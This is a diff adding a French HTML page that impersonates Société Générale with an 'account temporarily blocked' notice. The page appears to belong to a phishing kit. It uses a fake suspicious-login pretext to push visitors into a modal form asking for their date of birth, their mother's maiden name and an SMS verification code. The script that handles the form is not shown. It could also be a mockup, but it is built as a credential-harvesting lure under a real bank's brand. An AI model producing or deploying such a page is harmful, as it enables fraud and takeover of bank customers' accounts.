@@ -1,0 +1,147 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Société Générale - Compte Bloqué</title>
+    <link rel="stylesheet" href="styles/blocked.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+</head>
+<body>
+    <div class="blocked-container">
+        <div class="blocked-content">
+            <div class="sg-logo-center">
+                <img src="assets/images/sg-logo.svg" alt="Société Générale" class="sg-logo-img">
+            </div>
+            
+            <div class="warning-icon">
+                <i class="fas fa-exclamation-triangle"></i>
+            </div>
+            
+            <h1 class="blocked-title">Compte temporairement bloqué</h1>
+            
+            <div class="blocked-message">
+                <p class="main-message">
+                    Votre compte a été temporairement suspendu pour des raisons de sécurité.
+                </p>
+                <p class="sub-message">
+                    Cette mesure de précaution a été prise suite à plusieurs tentatives de connexion suspectes détectées sur votre compte.
+                </p>
+            </div>
+            
+            <div class="info-box">
+                <div class="info-item">
+                    <i class="fas fa-user-lock"></i>
+                    <div>
+                        <strong>Compte concerné</strong>
+                        <span id="blocked-account">•••• 4521</span>
+                    </div>
+                </div>
+                
+                <div class="info-item">
+                    <i class="fas fa-calendar-alt"></i>
+                    <div>
+                        <strong>Date du blocage</strong>
+                        <span id="block-date">07/01/2026 - 10:45</span>
+                    </div>
+                </div>
+                
+                <div class="info-item">
+                    <i class="fas fa-shield-alt"></i>
+                    <div>
+                        <strong>Raison</strong>
+                        <span>Activité suspecte détectée</span>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="action-section">
+                <h3>Que faire maintenant ?</h3>
+                <div class="action-cards">
+                    <div class="action-card">
+                        <i class="fas fa-phone-alt"></i>
+                        <h4>Contactez-nous</h4>
+                        <p>Appelez le service client au</p>
+                        <a href="tel:0969369696" class="phone-number">09 69 36 96 96</a>
+                        <span class="available">Disponible 24h/24 - 7j/7</span>
+                    </div>
+                    
+                    <div class="action-card">
+                        <i class="fas fa-building"></i>
+                        <h4>Agence la plus proche</h4>
+                        <p>Rendez-vous dans votre agence avec une pièce d'identité</p>
+                        <button class="btn-secondary">
+                            <i class="fas fa-map-marker-alt"></i>
+                            Trouver une agence
+                        </button>
+                    </div>
+                    
+                    <div class="action-card">
+                        <i class="fas fa-unlock-alt"></i>
+                        <h4>Déblocage en ligne</h4>
+                        <p>Répondez aux questions de sécurité pour débloquer votre compte</p>
+                        <button class="btn-primary" id="unblock-btn">
+                            <i class="fas fa-key"></i>
+                            Débloquer maintenant
+                        </button>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="security-tips">
+                <h3><i class="fas fa-lightbulb"></i> Conseils de sécurité</h3>
+                <ul>
+                    <li><i class="fas fa-check-circle"></i> Ne communiquez jamais vos codes confidentiels par téléphone ou email</li>
+                    <li><i class="fas fa-check-circle"></i> Vérifiez régulièrement vos opérations bancaires</li>
+                    <li><i class="fas fa-check-circle"></i> Utilisez un mot de passe fort et unique</li>
+                    <li><i class="fas fa-check-circle"></i> Activez la double authentification</li>
+                </ul>
+            </div>
+            
+            <div class="back-link">
+                <a href="index.html">
+                    <i class="fas fa-arrow-left"></i>
+                    Retour à la connexion
+                </a>
+            </div>
+        </div>
+    </div>
+    
+    <!-- Modal de déblocage -->
+    <div id="unblock-modal" class="modal">
+        <div class="modal-content">
+            <span class="close-modal">&times;</span>
+            <h2>Déblocage de compte</h2>
+            <p>Veuillez répondre aux questions de sécurité suivantes :</p>
+            
+            <form id="unblock-form">
+                <div class="form-group">
+                    <label>Quelle est votre date de naissance ?</label>
+                    <input type="date" required>
+                </div>
+                
+                <div class="form-group">
+                    <label>Quel est le nom de jeune fille de votre mère ?</label>
+                    <input type="text" placeholder="Nom de jeune fille" required>
+                </div>
+                
+                <div class="form-group">
+                    <label>Code de vérification envoyé par SMS</label>
+                    <input type="text" placeholder="6 chiffres" maxlength="6" required>
+                </div>
+                
+                <button type="submit" class="btn-primary">
+                    Valider le déblocage
+                </button>
+            </form>
+            
+            <div class="modal-info">
+                <i class="fas fa-info-circle"></i>
+                Le déblocage peut prendre jusqu'à 24 heures
+            </div>
+        </div>
+    </div>
+    
+    <script src="scripts/blocked.js"></script>
+</body>
+</html>
